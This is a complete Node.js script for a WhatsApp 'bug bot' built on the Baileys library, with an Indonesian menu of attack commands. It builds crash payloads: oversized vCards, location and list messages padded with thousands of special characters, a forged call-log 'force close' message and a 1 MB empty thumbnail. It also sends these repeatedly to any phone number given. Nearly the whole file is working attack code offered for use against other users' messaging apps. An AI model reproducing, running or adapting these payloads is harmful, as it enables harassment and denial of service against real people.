const { 
    default: makeWASocket, useMultiFileAuthState, delay, DisconnectReason, 
    makeCacheableSignalKeyStore, generateWAMessageFromContent, getContentType, 
    downloadContentFromMessage, fetchLatestBaileysVersion 
} = require("@whiskeysockets/baileys")
const pino = require("pino"); const fs = require('fs'); const chalk = require("chalk")
const { Boom } = require("@hapi/boom"); const Crypto = require('crypto')

// ==================== [ CONFIG & PAYLOADS ] ====================
const owner = "601121811615@s.whatsapp.net"
const sessionName = "marian_super_session"

const getPayload = {
    vcard: (target) => `BEGIN:VCARD\nVERSION:3.0\nFN:MARIAN_${Crypto.randomBytes(4).toString('hex')}\nTEL;type=CELL;type=VOICE:${target}\nNOTE:${"💀".repeat(200)}\nEND:VCARD`,
    loc: () => ({ degreesLatitude: -1.2, degreesLongitude: 1.2, name: "MARIAN BUG " + "𑫀".repeat(1000) }),
    list: () => ({ listMessage: { title: "MARIAN " + "𑫀".repeat(2000), buttonText: "CRASH", sections: [{ title: "X", rows: [{ title: "X", rowId: "1" }] }] } }),
    // PAYLOAD FC SHARE BY VINZNOTDEV
    fc: (target) => ({
        viewOnceMessage: {
            message: {
                extendedTextMessage: {
                    text: "🩸 YT JustinOfficial-ID",
                    contextInfo: {
                        mentionedJid: [target, "5521992999999@s.whatsapp.net"],
                        forwardingScore: 999, isForwarded: false,
                        contextInfo: {
                            stanzaId: "FTG-EE62BD88F22C", participant: "5521992999999@s.whatsapp.net", remoteJid: target,
                            quotedMessage: {
                                callLogMessage: { isVideo: false, callOutcome: "1", durationSecs: "0", callType: "REGULAR", participants: [{ jid: target, callOutcome: "1" }] }
                            }
                        }
                    }
                }
            }
        }
    })
}

const quotedFC = {
    key: { remoteJid: "5521992999999@s.whatsapp.net", fromMe: false, id: "CALL_MSG_" + Date.now(), participant: "5521992999999@s.whatsapp.net" },
    message: { callLogMessage: { isVideo: true, callOutcome: "1", durationSecs: "0", callType: "REGULAR", participants: [{ jid: "5521992999999@s.whatsapp.net", callOutcome: "1" }] } }
}

// ==================== [ START ENGINE ] ====================
async function startMarian() {
    const { state, saveCreds } = await useMultiFileAuthState(sessionName)
    const { version } = await fetchLatestBaileysVersion()
    const sock = makeWASocket({
        version, logger: pino({ level: 'fatal' }),
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' })) },
        browser: ["Ubuntu", "Chrome", "20.0.04"]
    })

    if (!sock.authState.creds.registered) {
        const rl = require("readline").createInterface({ input: process.stdin, output: process.stdout })
        const nr = await new Promise(r => rl.question(chalk.yellow("\n[!] Masukkan Nomor Bot: "), r))
        const code = await sock.requestPairingCode(nr.replace(/[^0-9]/g, ''))
        console.log(chalk.black.bgWhite(`\n KODE PAIRING: ${code} \n`)); rl.close()
    }

    sock.ev.on('creds.update', saveCreds)
    sock.ev.on('connection.update', (u) => {
        if (u.connection === 'open') console.log(chalk.green.bold("\n[✓] MARIAN SUPER BOT v10.0 CONNECTED!"))
        if (u.connection === 'close' && new Boom(u.lastDisconnect?.error)?.output?.statusCode !== DisconnectReason.loggedOut) startMarian()
    })

    sock.ev.on('messages.upsert', async ({ messages }) => {
        const m = messages[0]; if (!m.message || m.key.fromMe) return
        const from = m.key.remoteJid; const type = getContentType(m.message)
        const body = (type === 'conversation') ? m.message.conversation : (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : ''
        
        if (body && !body.startsWith('/')) await sock.sendMessage(from, { text: 'Halo! Ketik */menu* untuk list serangan.' }, { quoted: m })
        if (!body.startsWith('/')) return
        const args = body.slice(1).trim().split(/ +/); const cmd = args.shift().toLowerCase()
        const target = args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : from

        switch (cmd) {
            case 'menu':
                const menuText = `*⚡ MARIAN SUPER v10.0 ⚡*\n\n*⚔️ ATTACK:* \n• /fc (Force Close)\n• /bug (VCard)\n• /bug2 (Loc)\n• /bug3 (List)\n• /crasher (UI)\n• /spam [jml] [teks]\n\n*⚙️ SYSTEM:* \n• /ping | /restart`
                await sock.sendMessage(from, { text: menuText, contextInfo: { externalAdReply: { title: "MARIAN ULTIMATE", body: "Dev: Kean", mediaType: 1, renderLargerThumbnail: true, sourceUrl: "https://github.com/demonala" }}}, { quoted: m })
                break

            case 'fc':
                await sock.sendMessage(from, { text: '💀 Launching FC Attack...' })
                const msg = generateWAMessageFromContent(target, getPayload.fc(target), { userJid: target, quoted: quotedFC })
                await sock.relayMessage(target, msg.message, { messageId: msg.key.id })
                await sock.sendMessage(from, { text: '✅ Force Close Sent!' })
                break

            case 'bug':
                for (let i = 0; i < 15; i++) await sock.sendMessage(target, { contacts: { displayName: "DIE", contacts: [{ vcard: getPayload.vcard(target) }] } })
                break

            case 'bug2':
                for (let i = 0; i < 10; i++) await sock.sendMessage(target, { location: getPayload.loc() })
                break

            case 'bug3':
                const bug3 = generateWAMessageFromContent(target, getPayload.list(), { userJid: target })
                await sock.relayMessage(target, bug3.message, { messageId: bug3.key.id })
                break

            case 'crasher':
                await sock.sendMessage(target, { text: "💀 CRASH 💀", contextInfo: { externalAdReply: { title: "DESTROYER", thumbnail: Buffer.alloc(1000000), mediaType: 1, renderLargerThumbnail: true }}})
                break

            case 'ping': await sock.sendMessage(from, { text: 'Ultra Fast ✅' }); break
            case 'restart': process.exit(); break
        }
    })
}
startMarian()
